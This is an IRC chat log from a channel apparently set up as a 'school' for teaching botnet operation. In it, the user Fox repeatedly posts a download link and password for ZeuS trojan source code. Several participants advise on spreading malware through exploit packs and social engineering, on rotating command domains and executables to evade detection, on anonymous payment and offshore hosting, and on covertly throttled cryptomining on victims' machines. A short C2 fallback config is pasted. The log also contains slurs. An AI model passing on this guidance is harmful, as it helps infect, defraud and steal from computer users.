+Jun 24 22:42:41 <xochipilli>    is it your bot?
+Jun 24 22:42:43 <xochipilli>    or someone elses?
+Jun 24 22:42:48 <d0ct0r>    100%
+Jun 24 22:42:55 <nxnja`>    is there any working spreaders out there besides usb spread?
+Jun 24 22:42:56 <VanOfTheDusk>    Could you explain both situations to me?
+Jun 24 22:42:58 <xochipilli>    i dont understand the question
+Jun 24 22:43:05 <d0ct0r>    He is asking
+Jun 24 22:43:08 <TMK>    VanOfTheDusk, getting your internet line cut by your ISP for spamming the network
+Jun 24 22:43:10 <d0ct0r>    if he is the botherder
+Jun 24 22:43:10 <xochipilli>    nxnja`: yes, msn jabber etc
+Jun 24 22:43:13 <xochipilli>    or use an exploit pack
+Jun 24 22:43:19 <d0ct0r>    bt5 hs one
+Jun 24 22:43:20 <xochipilli>    and iframe it on compromised sites
+Jun 24 22:43:24 <Fox>    Kids.
+Jun 24 22:43:30 <Fox>    It’s time
+Jun 24 22:43:32 <d0ct0r>    oke yea he has asking if he is the botherder if he will get arrested by the feds
+Jun 24 22:43:33 <z3lat>    good place to start from is elastic hosts…
+Jun 24 22:43:35 <VanOfTheDusk>    wow. thanks TMK
+Jun 24 22:43:37 <Fox>    finish up your questions while I have a cigarette.
+Jun 24 22:43:49 <jester>    wtf
+Jun 24 22:43:49 <xochipilli>    ah
+Jun 24 22:43:52 <jester>    i dont think he is
+Jun 24 22:43:52 <xochipilli>    VanOfTheDusk: its possible
+Jun 24 22:43:57 <Phantom>    said tupac isnt here. and here is my question: can you use the botnet to target single ips?
+Jun 24 22:43:58 <Nameless>    hey niggas, what was that site to prove I’m the guy who put out the song?
+Jun 24 22:44:01 <RedStar>    thanx Fox
+Jun 24 22:44:02 <xochipilli>    i wouldnt host on your home connections lol
+Jun 24 22:44:07 <xochipilli>    u wanna use some shadey offshore hosting
+Jun 24 22:44:09 <jester>    sounded like he was asking about getting a net
+Jun 24 22:44:09 <Phantom>    sorry if my q is dumb :/
+Jun 24 22:44:10 <RedStar>    thanks all
+Jun 24 22:44:12 <jester>    like infected
+Jun 24 22:44:13 <xochipilli>    preferably that accepts payment in LR
+Jun 24 22:44:14 <jester>    i read it wrong
+Jun 24 22:44:14 <xochipilli>    pecunix
+Jun 24 22:44:15 <xochipilli>    WMZ
+Jun 24 22:44:16 <xochipilli>    etc
+Jun 24 22:44:16 <Fox>    Once again kids
+Jun 24 22:44:19 <jester>    lol @ phantom
+Jun 24 22:44:21 <Fox>    Going for a cig.
+Jun 24 22:44:21 <Fox>    :3
+Jun 24 22:44:25 <d0ct0r>    Why Liberty Reserver?
+Jun 24 22:44:25 <z3lat>    run anything off of elastic hosts 3 day vps trial
+Jun 24 22:44:31 <z3lat>    their server is in london
+Jun 24 22:44:33 <z3lat>    peer1
+Jun 24 22:44:36 <xochipilli>    pecunix or WMZ is fine too d0ct0r
+Jun 24 22:44:40 <xochipilli>    LR is just my prefernce
+Jun 24 22:44:42 <Phantom>    so lol = no? lol
+Jun 24 22:44:45 <xochipilli>    theyre all anonymous
+Jun 24 22:44:51 <d0ct0r>    never knew
+Jun 24 22:44:51 <xochipilli>    or easy to obtain anonymously
+Jun 24 22:44:53 <xochipilli>    and run outside of the US
+Jun 24 22:44:55 <d0ct0r>    I prefer bitcoins
+Jun 24 22:45:01 <d0ct0r>    Lol
+Jun 24 22:45:03 <xochipilli>    not many people accept BTC
+Jun 24 22:45:05 <xochipilli>    unfortunately
+Jun 24 22:45:07 <VanOfTheDusk>    I have no idea what i am asking because i still don’t fully understand any of this. I am a level 1 kiddo
+Jun 24 22:45:09 <jester>    and yes you can
+Jun 24 22:45:09 <xochipilli>    you can exchange BTC to LR
+Jun 24 22:45:12 <xochipilli>    mtgox does it
+Jun 24 22:45:17 <d0ct0r>    Oh never knew that
+Jun 24 22:45:18 <jester>    i was loling at saying no to tupac Phantom
+Jun 24 22:45:21 <Phantom>    what can you buy with bitcoins? dedicated servers maybe?
+Jun 24 22:45:23 <nxnja`>    couldnt you run miners on your botnet?
+Jun 24 22:45:27 <jester>    https://bitcoin-central.net/
+Jun 24 22:45:28 <xochipilli>    you could
+Jun 24 22:45:29 <jester>    yes nxnja`
+Jun 24 22:45:30 <Phantom>    oh ok jester
+Jun 24 22:45:31 <xochipilli>    that idea has been kicked around
+Jun 24 22:45:37 <p00l_b0y>    i have the source code for zeus, now what do i do? where should i start?
+Jun 24 22:45:37 <xochipilli>    not sure if its been implemented
+Jun 24 22:45:42 <jester>    its been implemented
+Jun 24 22:45:44 <d0ct0r>    Yes ninja On #bitcoin we are planning to do it
+Jun 24 22:45:52 <jester>    you can add a miner to your bot
+Jun 24 22:45:55 <nxnja`>    nice
+Jun 24 22:46:07 <xochipilli>    youll wanna throttle your mining
+Jun 24 22:46:10 <xochipilli>    thesame way you throttle a ddos
+Jun 24 22:46:15 <xochipilli>    so the user doesnt notice a performance problem
+Jun 24 22:46:17 <xochipilli>    and reformat
+Jun 24 22:46:23 <xochipilli>    or install a new av or smth
+Jun 24 22:46:26 <VanOfTheDusk>    i’m about to refortmat.
+Jun 24 22:46:38 <jester>    > fortmat
+Jun 24 22:46:39 <jester>    wolol
+Jun 24 22:46:47 <xochipilli>    ya
+Jun 24 22:46:48 <xochipilli>    refortmat
+Jun 24 22:46:52 <xochipilli>    way better than reformatting
+Jun 24 22:46:57 <VanOfTheDusk>    Mucho
+Jun 24 22:47:10 <xochipilli>    btw if anyone has logs of this plz pm them to fox
+Jun 24 22:47:12 <d0ct0r>    xochipilli can you be the botherder of zeus if you’re OS is linux?
+Jun 24 22:47:14 <xochipilli>    when we’re done w/ questions
+Jun 24 22:47:18 <xochipilli>    yes
+Jun 24 22:47:22 <xochipilli>    its an http bot
+Jun 24 22:47:27 <xochipilli>    it runs on the lam stack
+Jun 24 22:47:29 <xochipilli>    lamp*
+Jun 24 22:47:35 <xochipilli>    lamp = linux apache mysql php
+Jun 24 22:47:36 <VanOfTheDusk>    but seriously, How can anyone detect if their computer is being used?
+Jun 24 22:47:40 <xochipilli>    it will run on windows too
+Jun 24 22:47:45 <xochipilli>    anywhere u can run mysql and php
+Jun 24 22:47:49 <xochipilli>    VanOfTheDusk: you cant
+Jun 24 22:47:50 <xochipilli>    for sure
+Jun 24 22:47:55 <Fox>    Ok
+Jun 24 22:48:00 <Fox>    Time for goodies kids
+Jun 24 22:48:06 <d0ct0r>    But the zombie computers must be windows correct?
+Jun 24 22:48:15 <d0ct0r>    for zeus?
+Jun 24 22:48:22 <xochipilli>    yes
+Jun 24 22:48:25 <antisecpro>    snack time?
+Jun 24 22:48:30 <xochipilli>    the “clients” must be windows
+Jun 24 22:48:31 <d0ct0r>    I agree
+Jun 24 22:48:31 <vtm>    would it run under mono or wine?
+Jun 24 22:48:35 <vtm>    :d
+Jun 24 22:48:36 <Fox>    dsmca.com/zeus.rar
+Jun 24 22:48:37 <Fox>    dsmca.com/zeus.rar
+Jun 24 22:48:37 <d0ct0r>    lol xochipilli
+Jun 24 22:48:37 <xochipilli>    probably not
+Jun 24 22:48:38 <Fox>    dsmca.com/zeus.rar
+Jun 24 22:48:39 <Fox>    dsmca.com/zeus.rar
+Jun 24 22:48:45 <Fox>    MERRY BAR MITZVAH!
+Jun 24 22:48:55 <jester>    backdoor modified to point to this ircd
+Jun 24 22:48:55 <jester>    gg
+Jun 24 22:48:58 <jester>    (jk)
+Jun 24 22:49:03 <d0ct0r>    Oh no it has a backdoor!!!
+Jun 24 22:49:03 <xochipilli>    lol
+Jun 24 22:49:07 <d0ct0r>    lol
+Jun 24 22:49:16 <z3lat>    hey my screen is melting is that normal when downloading a rar file
+Jun 24 22:49:23 <z3lat>    xD
+Jun 24 22:49:25 <d0ct0r>    That happens
+Jun 24 22:49:36 <vtm>    k will open that shit in a vm
+Jun 24 22:49:39 <Fox>    Anyways
+Jun 24 22:49:44 <Fox>    Use it well kids
+Jun 24 22:49:47 <Phantom>    whats the password fox?
+Jun 24 22:49:51 <Faks>    desktop will turn into matrix 
+Jun 24 22:49:55 <Infinite>    its passworded
+Jun 24 22:49:58 <Mutiny>    fox
+Jun 24 22:50:00 <Mutiny>    dont say it
+Jun 24 22:50:00 <Mutiny>    if they cant guess it
+Jun 24 22:50:04 <Mutiny>    they don’t deserve it
+Jun 24 22:50:05 <Fox>    :3
+Jun 24 22:50:05 <Mutiny>    D:
+Jun 24 22:50:11 <p00l_b0y>    how do we know this doesnt have a bot with a crypter on it?
+Jun 24 22:50:11 <Fox>    DONATE FOR PW
+Jun 24 22:50:13 <Fox>    lololol
+Jun 24 22:50:16 <vtm>    zeus
+Jun 24 22:50:17 <vtm>    :d
+Jun 24 22:50:18 <Phantom>    
+Jun 24 22:50:23 <jester>    its source code ladies
+Jun 24 22:50:26 <jester>    if you cant compile it
+Jun 24 22:50:26 <jester>    your loss
+Jun 24 22:50:28 <Fox>    jk
+Jun 24 22:50:36 <Fox>    Also you don’t.
+Jun 24 22:50:42 <Fox>    So either trust, or don’t.
+Jun 24 22:50:45 <Fox>    either is a good choice.
+Jun 24 22:50:52 <Infinite>    heh pw is easy
+Jun 24 22:50:52 <TMK>    easy pass :/
+Jun 24 22:50:55 <xochipilli>    p00l_b0y:
+Jun 24 22:50:55 <jester>    in the end
+Jun 24 22:50:59 <xochipilli>    zeus actually has a built in crypter
+Jun 24 22:51:03 <xochipilli>    its just very detected
+Jun 24 22:51:04 <jester>    donate bitcoins to school4lulz and to the teachers
+Jun 24 22:51:07 <xochipilli>    so you need to crypt it yourself still
+Jun 24 22:51:08 <Fox>    :3
+Jun 24 22:51:19 <Mutiny>    lol
+Jun 24 22:51:21 <Fox>    xochipilli
+Jun 24 22:51:22 <Mutiny>    Avast just raped my ears
+Jun 24 22:51:24 <Fox>    are you done
+Jun 24 22:51:27 <z3lat>    lol
+Jun 24 22:51:30 <Fox>    or do you have more
+Jun 24 22:51:30 <p00l_b0y>    haha ok thanks guys
+Jun 24 22:51:32 <z3lat>    hotmail wont scan file
+Jun 24 22:51:35 <Faks>    thanks ??????? 
+Jun 24 22:51:35 <Akio>    What version is it?
+Jun 24 22:51:37 <d0ct0r>    the password for me was
+Jun 24 22:51:46 <d0ct0r>    U have a trojan
+Jun 24 22:51:49 <vtm>    lol
+Jun 24 22:51:54 <Fox>    PASSWORD IS ZEUS GODDAMNIT
+Jun 24 22:51:56 <d0ct0r>    lol
+Jun 24 22:51:57 <Fox>    FUCK.
+Jun 24 22:52:01 <d0ct0r>    Don’t tell them
+Jun 24 22:52:02 <jester>    rofl
+Jun 24 22:52:02 <skavurzka__>    lol
+Jun 24 22:52:08 <z3lat>    command list?
+Jun 24 22:52:26 <d0ct0r>    Yea if they couldn’t have guessed that they were retarted
+Jun 24 22:52:41 <jester>    Jester’s teaching fund: 14x3xWNuiFq3SZuU3d6Nh4z8N2WgDHZBgA
+Jun 24 22:52:48 <jester>    fox wuts schools bitcoin address
+Jun 24 22:52:49 <Fox>    Ok kids
+Jun 24 22:53:00 <Fox>    18hRWnxoHztBPDYQ9bPA1uUpN8LTrd7xbB
+Jun 24 22:53:05 *    Fox sets mode +m #school4lulz
+Jun 24 22:53:12 <Fox>    Ok kids
+Jun 24 22:53:20 <Fox>    time for Fox to sit down and talk to you guys
+Jun 24 22:53:32 <Fox>    So now that you have some rly k3w1 source code
+Jun 24 22:53:44 <Fox>    We’re going to do a little talk on automation
+Jun 24 22:53:46 <Fox>    and protection
+Jun 24 22:54:03 <Fox>    Now as you know I’ve done talks on fraudster extrodinare
+Jun 24 22:54:06 <Fox>    myself.
+Jun 24 22:54:16 <Fox>    You don’t expect your car to run without gas and tune ups
+Jun 24 22:54:21 <Fox>    don’t expect your botnet to either.
+Jun 24 22:54:31 <Fox>    I’ll hand you a gun here, and some bullets
+Jun 24 22:54:35 <Fox>    but I won’t load it for you
+Jun 24 22:54:42 <Fox>    You’ll have to think a little on your own kids
+Jun 24 22:54:48 <Fox>    So obviously there are some things ya need
+Jun 24 22:54:53 <Fox>    a domain being a big one
+Jun 24 22:55:28 <Fox>    Registrars from legit sources tend to kill shit real quick once you’ve gotten reported as malware, unless you’re going out to some tld that doesn’t give a fuck
+Jun 24 22:55:47 <Fox>    So frauding out domains is really a pain in the ass
+Jun 24 22:55:59 <Fox>    go to the coffee shop, buy the domain, set it up, et cetera, et cetera
+Jun 24 22:56:02 <Fox>    fuck that.
+Jun 24 22:56:11 <Fox>    We like automation we’re lazy
+Jun 24 22:56:32 <Fox>    So when finding a registrar, check for the ability to push via API’s for domain reg’s
+Jun 24 22:56:44 <Fox>    Or pretty much any way that you can make the process easier on yourself
+Jun 24 22:56:50 <Fox>    as a rule of thumb in my case
+Jun 24 22:57:17 <Fox>    every 10,000 nodes I will change up the node executable and control domain
+Jun 24 22:57:33 <Fox>    as washing them out in such small intervals prevents a lot of the problems we’ve discussed
+Jun 24 22:57:42 <Fox>    the issues with signatures being developed,
+Jun 24 22:57:57 <Fox>    domains being shut down (and without a secondary control method, losing your well earned boats)
+Jun 24 22:58:30 <Fox>    I was also told to mention opennic as a DNS alternative which is true
+Jun 24 22:58:42 <Fox>    Now my personal favorite method
+Jun 24 22:59:03 <Fox>    is a control domain with a secondary control method of a box that I know i’ll have control over for the forseeable future
+Jun 24 22:59:38 *    jester gives voice to selketraz
+Jun 24 22:59:46 <Fox>    I have a particular host in the motherland, that allows me to have my secondary box as a direct CnC
+Jun 24 22:59:47 <selketraz>    thanks
+Jun 24 23:00:11 <Mutiny>    I fucking love the motherland.
+Jun 24 23:00:15 <selketraz>    antisec is insaaaane
+Jun 24 23:00:20 <Fox>    This is pretty much a preference of nearly any professional that I know
+Jun 24 23:00:21 <jester>    will you be quiet woman
+Jun 24 23:00:35 <selketraz>    not really
+Jun 24 23:00:40 *    Fox has kicked selketraz from #school4lulz (Stfu)
+Jun 24 23:00:47 <jester>    lmfao
+Jun 24 23:00:59 <Fox>    now quick protip on friendly countries:
+Jun 24 23:01:00 <Fox>    Russia
+Jun 24 23:01:04 <Fox>    Ukraine
+Jun 24 23:01:06 <Fox>    Brazil
+Jun 24 23:01:08 <Fox>    Panama
+Jun 24 23:01:15 <Fox>    Switzerland (sort of)
+Jun 24 23:01:17 <d0ct0r>    Sweden
+Jun 24 23:01:20 <Fox>    Lithuania
+Jun 24 23:01:26 <Fox>    and China
+Jun 24 23:01:31 <Fox>    There are obviously others
+Jun 24 23:01:36 <Fox>    but these guys I like the most.
+Jun 24 23:01:43 <Fox>    And that’s all that is important in this world.
+Jun 24 23:02:09 <jester>    const char dnsList[][100] =
+Jun 24 23:02:10 <jester>    {
+Jun 24 23:02:13 <jester>        “localhost”,
+Jun 24 23:02:14 <jester>        “aids.cz”,
+Jun 24 23:02:17 <jester>        “endlessdomains.co.uk”
+Jun 24 23:02:18 <jester>    };
+Jun 24 23:02:20 <jester>    unsigned int serverPort = 4243;
+Jun 24 23:02:23 <jester>    unsigned int maxConnections = 20000;
+Jun 24 23:02:23 <jester>    ^
+Jun 24 23:02:25 <jester>    dat config
+Jun 24 23:02:27 <jester>    lots of dnses
+Jun 24 23:02:27 <Fox>    :3
+Jun 24 23:02:29 <jester>    to fallback on
+Jun 24 23:02:34 <Fox>    <3 @ jester
+Jun 24 23:02:50 <Fox>    Anyways moving along the line
+Jun 24 23:03:11 <Fox>    Treat your bots, like you treat a sports car. With even amounts respect, paranoia, and love.
+Jun 24 23:03:31 <Fox>    You’re a little afraid of it yourself, you’re scared to death someone will steal it, and you think it’s the best one in the world.
+Jun 24 23:03:42 <Fox>    Do that and I promise you you’ll go far.
+Jun 24 23:03:55 <Fox>    Ontop of that there is how do I get my executable out to the rest of the worldses
+Jun 24 23:03:58 <Fox>    Well
+Jun 24 23:03:59 <Fox>    thats easy
+Jun 24 23:04:16 *    Mutiny is now known as PohmasTaine
+Jun 24 23:04:18 <d0ct0r>    Various ways
+Jun 24 23:04:18 <Fox>    either A. Get famous an release noodpix.exe
+Jun 24 23:04:24 <jester>    rofl
+Jun 24 23:04:32 <d0ct0r>    lol
+Jun 24 23:04:39 *    PohmasTaine is now known as OarackBbama
+Jun 24 23:04:42 *    jimmyjohn is now known as FenjaminBranklin
+Jun 24 23:04:52 <Fox>    or B. Spread the executable by social engineering until you have enough to scan on your own and have the net work for you
+Jun 24 23:04:53 <OarackBbama>    fuck didn’t mean to start a trend
+Jun 24 23:05:03 *    OarackBbama is now known as Mutiny
+Jun 24 23:05:07 *    LulzLizard[925] is now known as RevinKudd
+Jun 24 23:05:15 <Mutiny>    Apologies Fox and whoever is logging this.
+Jun 24 23:05:19 <d0ct0r>    C. Cross-Scripting
+Jun 24 23:05:25 <jester>    …
+Jun 24 23:05:25 <jester>    what
+Jun 24 23:05:34 *    WeAreRevenge is now known as ReAreWevenge
+Jun 24 23:05:40 <d0ct0r>    So when they click the link the button downloads
+Jun 24 23:05:49 <Fox>    Ok. Nick change = kick. No bullshit you faggots.
+Jun 24 23:05:52 <d0ct0r>    well send sthe file to them
+Jun 24 23:06:26 <Fox>    Anyways continuing down the line of line-y ness
+Jun 24 23:06:29 <jester>    exploit packs
+Jun 24 23:06:31 <jester>    can be used
+Jun 24 23:06:34 <d0ct0r>    And if you guys still don’t know how to compile the source code just read the readme
+Jun 24 23:06:34 <Fox>    don’t fucking put this on hostgator for christ sakes.
+Jun 24 23:06:37 <jester>    on domains with lots of traffic
+Jun 24 23:06:38 <d0ct0r>    LOL
+Jun 24 23:06:40 <d0ct0r>    fox
+Jun 24 23:06:51 <Fox>    or .tk shit
+Jun 24 23:06:52 <Fox>    or any other 9.99 host.
+Jun 24 23:06:52 <Fox>    Cause
+Jun 24 23:06:55 <Fox>    you’ll get fucked.
+Jun 24 23:07:03 <d0ct0r>    Fox who do you use?
+Jun 24 23:07:18 <Fox>    For dump boxes I like santrex
+Jun 24 23:07:35 <Fox>    for permanents I like either my personal contact that does co-lo at a black site
+Jun 24 23:08:03 <d0ct0r>    oh nice
+Jun 24 23:08:08 <Fox>    or I’ll just load up a prepaid for a box with a legit US provider, and have traffic piped from throwaway box, to big box
+Jun 24 23:08:12 <Fox>    IE: Tiered setup
+Jun 24 23:09:04 <Fox>    Anyways
+Jun 24 23:09:15 *    Fox sets mode -m #school4lulz
+Jun 24 23:09:15 *    AnonOps sets mode +m #school4lulz
+Jun 24 23:09:25 <Fox>    Questions?
+Jun 24 23:09:28 <re_rock>    hello hello
+Jun 24 23:09:49 <Fox>    Questions?
+Jun 24 23:09:59 <Faks>    nope no questions 
+Jun 24 23:10:00 <jester>    yes
+Jun 24 23:10:05 <jester>    give me all ur bots
+Jun 24 23:10:09 <jester>    or else
+Jun 24 23:10:09 <antisecpro>    can you post the link to zues again
+Jun 24 23:10:13 <re_rock>    will the log be posted for dumb asses like me who missed it?
+Jun 24 23:10:18 <antisecpro>    srry sleep deprived
+Jun 24 23:10:21 <antisecpro>    lol
+Jun 24 23:10:21 <Fox>    yes
+Jun 24 23:10:23 <davispuh>    does it works with UAC on win7 with limited user etc ?
+Jun 24 23:10:27 <FenjaminBranklin>    yes please post the link for zues
+Jun 24 23:10:29 <Fox>    dsmca.com/zeus.rar
+Jun 24 23:10:31 <Fox>    I think
+Jun 24 23:10:34 <Faks>    http://dsmca.com/zeus.rar
+Jun 24 23:10:34 <FenjaminBranklin>    and tohr
+Jun 24 23:10:52 <Fox>    tohr?
+Jun 24 23:10:54 <Fox>    wtf
+Jun 24 23:10:59 <Mutiny>    Logs will be posted on lolhackers.com/school
+Jun 24 23:11:01 <d0ct0r>    Spellga needs help
+Jun 24 23:11:04 <Faks>    i all ready hidden it in my wuala 
+Jun 24 23:11:12 <d0ct0r>    Spellga ask them your question
+Jun 24 23:11:20 <Fox>    Hey Willie
+Jun 24 23:11:33 <Fox>    Nice of you to join!
+Jun 24 23:11:38 <d0ct0r>    I am being bombarded with pms
+Jun 24 23:11:49 <FenjaminBranklin>    you should get that checked out
+Jun 24 23:11:49 <d0ct0r>    So instead of pming me send me bitcoins at: 1J2pkgrdrZTY9AZ9StcuvdTGByAK9yJZqJ
+Jun 24 23:11:56 <jester>    woah
+Jun 24 23:12:01 <jester>    nobody PM me to dontate ;~;
+Jun 24 23:12:04 <jester>    donate**
+Jun 24 23:12:06 <d0ct0r>    lol
+Jun 24 23:12:10 <jester>    Jester’s teaching fund: 14x3xWNuiFq3SZuU3d6Nh4z8N2WgDHZBgA
+Jun 24 23:12:10 <Fox>    Donate to the school
+Jun 24 23:12:11 <jester>    :>
+Jun 24 23:12:11 <Fox>    if anything
+Jun 24 23:12:17 <Fox>    Both of you assholes
+Jun 24 23:12:19 <Fox>    stop whoring
+Jun 24 23:12:21 <jester>    fuck you
+Jun 24 23:12:22 <jester>    im poor
+Jun 24 23:12:22 <jester>    lol
+Jun 24 23:12:23 <Fox>    cause I don’t make money off this.
+Jun 24 23:12:23 <d0ct0r>    lol
+Jun 24 23:13:00 <Fox>    Anyways
+Jun 24 23:13:05 <d0ct0r>    I will donate $10-30 next month
+Jun 24 23:13:09 <d0ct0r>    I promise
+Jun 24 23:13:11 <Fox>    Kids I’m losing coherence.
+Jun 24 23:13:18 <Fox>    Any questions?
+Jun 24 23:13:42 <d0ct0r>    This guy does
+Jun 24 23:13:44 <d0ct0r>    Spellga
+Jun 24 23:13:50 <d0ct0r>    keeps pming me lol
+Jun 24 23:13:53 <Fox>    Spellga
+Jun 24 23:13:59 <Fox>    fucking say something you cunt.
+Jun 24 23:14:05 <d0ct0r>    11:10pm] Spellga: bro mind giving me a hand to compile zeus i dont know a shit about c++
+Jun 24 23:14:10 <jester>    lul
+Jun 24 23:14:14 <d0ct0r>    I explained it to him
+Jun 24 23:14:14 <d0ct0r>    twice
+Jun 24 23:14:16 <d0ct0r>    good luck
+Jun 24 23:14:17 <Mutiny>    lawl
+Jun 24 23:14:23 *    c0rrupt is now known as lolplus-m
+Jun 24 23:14:38 <Fox>    LOL
+Jun 24 23:14:40 *    Fox sets mode -m #school4lulz
+Jun 24 23:14:43 <xochipilli>    hey
+Jun 24 23:14:45 <Fox>    I am obviously
+Jun 24 23:14:46 <xochipilli>    does anyone have logs
+Jun 24 23:14:47 <Fox>    drunks as fuck.
+Jun 24 23:14:47 <xochipilli>    ?
+Jun 24 23:14:47 <selketraz>    heh
+Jun 24 23:14:51 <vtm>    yesh
+Jun 24 23:14:53 <xochipilli>    if so send to Fox
+Jun 24 23:14:53 <Fox>    SEC
+Jun 24 23:14:53 <d0ct0r>    Lol fox
+Jun 24 23:14:55 <Fox>    logs
+Jun 24 23:14:56 <yngjungian>    Once you have the botnet, everything’s setup, then what? (besides DDOS)
+Jun 24 23:14:57 *    lolplus-m is now known as c0rrupt
+Jun 24 23:14:59 <vtm>    i has but lets finish this
+Jun 24 23:15:02 <FenjaminBranklin>    hooray
+Jun 24 23:15:02 <Fox>    Ok
+Jun 24 23:15:04 <Fox>    sec sec
+Jun 24 23:15:04 <AnonT>    read me??
+Jun 24 23:15:04 <Fox>    sec
+Jun 24 23:15:06 <xochipilli>    yngjungian: get money
+Jun 24 23:15:06 <xochipilli>    logins
+Jun 24 23:15:06 <Fox>    shhh
+Jun 24 23:15:07 <xochipilli>    validz
+Jun 24 23:15:09 <JohmasTefferson>    Question
+Jun 24 23:15:13 <Fox>    Logs
+Jun 24 23:15:17 <Fox>    I need
+Jun 24 23:15:19 <Fox>    the log
+Jun 24 23:15:22 <vtm>    uploading
+Jun 24 23:15:24 <c0rrupt>    d0ct0r teach me to be 1337
+Jun 24 23:15:29 <xochipilli>    vtm: thx nigga <3
+Jun 24 23:15:32 <Fox>    K
+Jun 24 23:15:38 <d0ct0r>    z3lat: hey i gtg soon but, i compile the executable and then run it on a VM
+
